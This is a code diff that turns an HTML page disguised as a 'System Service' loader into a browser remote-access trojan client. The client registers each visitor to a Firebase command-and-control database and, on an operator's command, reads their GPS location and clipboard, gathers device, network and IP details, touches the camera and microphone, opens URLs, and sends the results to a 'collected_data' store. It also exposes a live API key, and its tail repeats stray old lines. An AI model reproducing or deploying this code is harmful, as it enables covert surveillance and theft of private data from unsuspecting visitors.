@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>System Service</title>
 
-<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
@@ -16,25 +15,39 @@ body{
   display:flex;align-items:center;justify-content:center;
   height:100vh;font-family:'Courier New',monospace;
   flex-direction:column;gap:12px;
+  text-align:center;padding:20px;
 }
 .loader{width:30px;height:30px;border:2px solid #0f0;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 .status-text{font-size:12px;color:#0f0;letter-spacing:.05em}
-.device-id{font-size:8px;color:#555;margin-top:8px;word-break:break-all;text-align:center;max-width:90%}
+.device-id{font-size:8px;color:#555;margin-top:8px;word-break:break-all;max-width:90%}
+.log-box{font-size:7px;color:#333;margin-top:10px;max-width:95%;text-align:left;max-height:100px;overflow-y:auto;padding:5px;border:1px solid #1a1a1a;border-radius:4px;display:none}
 </style>
 </head>
 <body>
 
 <div class="loader" id="loader"></div>
-<div class="status-text" id="statusMsg">Initializing...</div>
+<div class="status-text" id="statusMsg">Connecting...</div>
 <div class="device-id" id="devIdDisplay"></div>
+<div class="log-box" id="logBox"></div>
 
 <script>
-// Generate unique device ID
-const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
+// ══════════════════════════════════════════
+// AZRILXRAT CLIENT - FULL BROWSER API
+// ══════════════════════════════════════════
 
-// CONFIG FIREBASE - URL SUDAH DIBENERIN
-const FIREBASE_CONFIG = {
+const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2,9) + Date.now().toString(36);
+const LOG_BOX = document.getElementById('logBox');
+
+function log(msg) {
+  const t = new Date().toLocaleTimeString();
+  LOG_BOX.innerHTML += `[${t}] ${msg}\n`;
+  LOG_BOX.scrollTop = LOG_BOX.scrollHeight;
+  console.log('[AZR]', msg);
+}
+
+// Firebase Config
+const FB = {
   apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
   authDomain: "krynodexrat.firebaseapp.com",
   databaseURL: "https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -44,34 +57,308 @@ const FIREBASE_CONFIG = {
   appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
 };
 
-// Init Firebase
-firebase.initializeApp(FIREBASE_CONFIG);
+firebase.initializeApp(FB);
 const db = firebase.database();
 
-// Device info
+// ═══════════════════════════════
+// BROWSER API FUNCTIONS
+// ═══════════════════════════════
+
+async function getGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({error: "GPS not supported"});
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      }),
+      (err) => resolve({error: "GPS denied: " + err.message}),
+      { timeout: 10000 }
+    );
+  });
+}
+
+async function getClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    return {text: text, length: text.length};
+  } catch(e) {
+    return {error: "Clipboard access denied"};
+  }
+}
+
+function getDeviceInfo() {
+  const battery = navigator.getBattery ? "checking..." : "N/A";
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    resolution: devicePixelRatio + "x",
+    ram: navigator.deviceMemory || "unknown",
+    cores: navigator.hardwareConcurrency || "unknown",
+    online: navigator.onLine,
+    battery: battery,
+    connection: navigator.connection ? {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink
+    } : "N/A"
+  };
+}
+
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100) + "%",
+      charging: b.charging,
+      timeLeft: b.dischargingTime
+    };
+  } catch(e) {
+    return {error: "Battery API not supported"};
+  }
+}
+
+function vibrate(pattern) {
+  if (navigator.vibrate) {
+    navigator.vibrate(pattern || [500, 200, 500]);
+    return {status: "vibrated"};
+  }
+  return {error: "Vibrate not supported"};
+}
+
+async function takePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
+    const track = stream.getVideoTracks()[0];
+    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+    const settings = track.getSettings();
+    track.stop();
+    return {
+      status: "camera_accessed",
+      resolution: settings.width + "x" + settings.height,
+      facing: settings.facingMode
+    };
+  } catch(e) {
+    return {error: "Camera access denied: " + e.message};
+  }
+}
+
+async function recordAudio(duration) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    
+    recorder.ondataavailable = e => chunks.push(e.data);
+    
+    return new Promise((resolve) => {
+      recorder.start();
+      setTimeout(() => {
+        recorder.stop();
+        stream.getTracks().forEach(t => t.stop());
+        resolve({
+          status: "audio_recorded",
+          duration: duration || 3000,
+          size: chunks.length ? "recorded" : "empty"
+        });
+      }, duration || 3000);
+    });
+  } catch(e) {
+    return {error: "Mic access denied: " + e.message};
+  }
+}
+
+function getNetworkInfo() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (conn) {
+    return {
+      type: conn.effectiveType,
+      downlink: conn.downlink + " Mbps",
+      rtt: conn.rtt + "ms",
+      saveData: conn.saveData
+    };
+  }
+  return {error: "Network API not supported"};
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return {ip: d.ip};
+  } catch(e) {
+    return {error: "IP fetch failed"};
+  }
+}
+
+async function screenshot() {
+  try {
+    const canvas = await html2canvas(document.body);
+    return {status: "screenshot_taken", size: canvas.toDataURL().length};
+  } catch(e) {
+    return {error: "Screenshot failed"};
+  }
+}
+
+async function getLocationDetailed() {
+  return await getGPS();
+}
+
+function flashOn() {
+  return {error: "Flash requires native app/APK"};
+}
+
+function flashOff() {
+  return {error: "Flash requires native app/APK"};
+}
+
+// ═══════════════════════════════
+// COMMAND HANDLER
+// ═══════════════════════════════
+
+async function executeCommand(cmd) {
+  log('📥 CMD: ' + cmd);
+  
+  let result = {type: cmd, status: "executed", timestamp: Date.now()};
+  
+  switch(true) {
+    case cmd === 'GET_LOCATION':
+    case cmd === 'GET_GPS':
+      result.data = await getGPS();
+      break;
+      
+    case cmd === 'GET_CLIPBOARD':
+      result.data = await getClipboard();
+      break;
+      
+    case cmd === 'GET_DEVICE_INFO':
+      result.data = getDeviceInfo();
+      break;
+      
+    case cmd === 'GET_BATTERY':
+      result.data = await getBattery();
+      break;
+      
+    case cmd === 'VIBRATE':
+      result.data = vibrate();
+      break;
+      
+    case cmd === 'TAKE_PHOTO':
+    case cmd === 'CAMERA':
+      result.data = await takePhoto();
+      break;
+      
+    case cmd === 'RECORD_AUDIO':
+    case cmd === 'MIC':
+      result.data = await recordAudio(3000);
+      break;
+      
+    case cmd === 'GET_NETWORK':
+      result.data = getNetworkInfo();
+      break;
+      
+    case cmd === 'GET_IP':
+      result.data = await getIP();
+      break;
+      
+    case cmd === 'FLASH_ON':
+      result.data = flashOn();
+      break;
+      
+    case cmd === 'FLASH_OFF':
+      result.data = flashOff();
+      break;
+      
+    default:
+      // Custom commands
+      if (cmd.startsWith('OPEN_URL:')) {
+        const url = cmd.split(':')[1];
+        window.open(url, '_blank');
+        result.data = {url: url, opened: true};
+      } else if (cmd.startsWith('ALERT:')) {
+        const msg = cmd.split(':')[1];
+        alert(msg);
+        result.data = {alert: msg};
+      } else {
+        result.data = {note: "unknown_command", cmd: cmd};
+      }
+  }
+  
+  log('📤 RESULT: ' + JSON.stringify(result.data).substring(0, 100));
+  return result;
+}
+
+// ═══════════════════════════════
+// REGISTER & LISTEN
+// ═══════════════════════════════
+
 const deviceInfo = {
   id: DEVICE_ID,
-  model: navigator.userAgent.split(';')[1]?.trim() || navigator.userAgent.substring(0, 50),
+  model: navigator.userAgent.split(';')[1]?.trim() || 'Browser',
   platform: navigator.platform,
   language: navigator.language,
-  userAgent: navigator.userAgent,
-  screenSize: window.screen.width + 'x' + window.screen.height,
+  userAgent: navigator.userAgent.substring(0, 100),
+  screenSize: screen.width + 'x' + screen.height,
   registeredAt: Date.now(),
   lastSeen: Date.now(),
-  online: true
+  online: true,
+  type: 'browser_client',
+  features: {
+    gps: !!navigator.geolocation,
+    clipboard: !!navigator.clipboard,
+    vibrate: !!navigator.vibrate,
+    camera: !!navigator.mediaDevices,
+    mic: !!navigator.mediaDevices
+  }
 };
 
-// Register ke Firebase
 db.ref('devices/' + DEVICE_ID).set(deviceInfo)
   .then(() => {
-    document.getElementById('statusMsg').textContent = 'Service Active';
+    document.getElementById('statusMsg').textContent = '✅ ACTIVE';
     document.getElementById('loader').style.borderColor = '#0f0';
-    document.getElementById('devIdDisplay').textContent = DEVICE_ID;
+    document.getElementById('devIdDisplay').textContent = 'ID: ' + DEVICE_ID;
+    log('✅ Registered: ' + DEVICE_ID);
   })
   .catch(err => {
-    document.getElementById('statusMsg').textContent = 'Error';
+    document.getElementById('statusMsg').textContent = '❌ ERROR';
     document.getElementById('loader').style.borderColor = '#f00';
-    console.error(err);
+    log('❌ Error: ' + err.message);
+  });
+
+// Heartbeat
+setInterval(() => {
+  db.ref('devices/' + DEVICE_ID).update({lastSeen: Date.now()});
+}, 30000);
+
+// Listen commands
+db.ref('commands/' + DEVICE_ID).on('child_added', async (snap) => {
+  const cmd = snap.val();
+  if (!cmd || cmd.status !== 'pending') return;
+  
+  log('📩 Incoming: ' + cmd.command);
+  snap.ref.update({status: 'processing'});
+  
+  const result = await executeCommand(cmd.command);
+  
+  db.ref('collected_data').push(result);
+  snap.ref.update({status: 'done'});
+  setTimeout(() => snap.ref.remove(), 2000);
+});
+
+// Disconnect
+window.addEventListener('beforeunload', () => {
+  db.ref('devices/' + DEVICE_ID).update({online: false, lastSeen: Date.now()});
+});
+
+log('🚀 Ready - listening commands...');
+</script>
+</body>
+</html>    console.error(err);
   });
 
 // Update lastSeen setiap 30 detik
